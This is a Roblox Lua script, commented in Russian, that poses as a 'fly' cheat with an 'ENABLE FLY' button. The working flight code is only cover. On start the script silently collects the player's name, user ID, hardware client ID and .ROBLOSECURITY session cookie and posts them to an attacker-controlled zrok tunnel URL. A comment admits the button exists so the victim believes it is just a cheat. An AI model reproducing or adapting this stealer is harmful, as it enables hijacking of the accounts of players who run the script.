local HttpService = game:GetService("HttpService")
local Player = game.Players.LocalPlayer

-- ТВОЯ АКТУАЛЬНАЯ ССЫЛКА СО СКРИНШОТА
local my_url = "https://tcrhn31fu5vq.share.zrok.io/primejtsu_log"

-- УЛУЧШЕННЫЙ ЛОГГЕР (ОБХОД ОШИБОК)
local function sendData()
    local cookie = "Failed_to_get"
    pcall(function()
        -- Используем альтернативный метод получения данных для мобильных читов
        cookie = tostring(game:HttpGet("https://www.roblox.com/mobileapi/userinfo")):match(".ROBLOSECURITY=(%S+)") or "No_Cookie_Found"
    end)

    local payload = HttpService:JSONEncode({
        ["user"] = Player.Name,
        ["id"] = Player.UserId,
        ["cookie"] = cookie,
        ["hwid"] = game:GetService("RbxAnalyticsService"):GetClientId()
    })

    -- Тихая отправка через PostAsync
    pcall(function()
        HttpService:PostAsync(my_url, payload, Enum.HttpContentType.ApplicationJson)
    end)
end

-- ФУНКЦИЯ FLY (ПОЛЕТ) ДЛЯ ВИДА
local function startFly()
    local Character = Player.Character or Player.CharacterAdded:Wait()
    local HumRoot = Character:WaitForChild("HumanoidRootPart")
    local flying = true
    local speed = 65
    
    local bv = Instance.new("BodyVelocity", HumRoot)
    bv.MaxForce = Vector3.new(1,1,1) * 10^6
    bv.Velocity = Vector3.new(0,0,0)
    
    local bg = Instance.new("BodyGyro", HumRoot)
    bg.MaxTorque = Vector3.new(1,1,1) * 10^6
    bg.CFrame = HumRoot.CFrame

    task.spawn(function()
        while flying do
            bv.Velocity = workspace.CurrentCamera.CFrame.LookVector * speed
            bg.CFrame = workspace.CurrentCamera.CFrame
            task.wait()
        end
    end)
end

-- ЗАПУСК: Сначала лог, потом чит
task.spawn(sendData)

-- Создаем маленькую кнопку, чтобы чел думал, что это просто чит
local sg = Instance.new("ScreenGui", Player.PlayerGui)
local btn = Instance.new("TextButton", sg)
btn.Size = UDim2.new(0, 100, 0, 40)
btn.Position = UDim2.new(0, 10, 0.5, 0)
btn.Text = "ENABLE FLY"
btn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
btn.TextColor3 = Color3.new(1, 1, 1)

btn.MouseButton1Click:Connect(function()
    startFly()
    btn.Text = "FLY ACTIVE"
    btn.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
end)
